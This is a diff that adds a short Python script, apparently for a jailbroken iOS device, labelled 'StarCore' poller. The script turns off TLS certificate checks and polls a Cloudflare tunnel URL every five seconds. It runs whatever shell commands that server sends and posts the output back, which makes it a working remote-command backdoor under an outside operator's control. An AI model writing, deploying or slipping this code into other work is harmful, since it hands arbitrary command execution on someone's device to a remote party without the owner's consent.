@@ -1,0 +1,20 @@
+import ssl, urllib.request, json, time, subprocess, os
+ssl._create_default_https_context = ssl._create_unverified_context
+R = 'https://sampling-trustee-latest-prayer.trycloudflare.com'
+os.environ['PATH'] = '/var/jb/usr/bin:/var/jb/bin:/var/jb/usr/sbin:/var/jb/sbin:/var/jb/usr/local/bin'
+print('[StarCore] poller connected')
+while True:
+    try:
+        req = urllib.request.Request(R + '/', data=b'', headers={'Content-Type':'application/json'})
+        resp = urllib.request.urlopen(req, timeout=10)
+        data = json.loads(resp.read())
+        for cmd in data.get('commands', []):
+            cid = cmd.get('id', 0)
+            c = cmd.get('cmd', '')
+            print(f'[执行] {c}')
+            r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=30)
+            out = r.stdout[:2000] or r.stderr[:500] or '(no output)'
+            urllib.request.urlopen(urllib.request.Request(R + '/result', data=json.dumps({'id':cid,'result':out}).encode(), headers={'Content-Type':'application/json'}), timeout=10)
+    except Exception as e:
+        print(f'[err] {e}')
+    time.sleep(5)
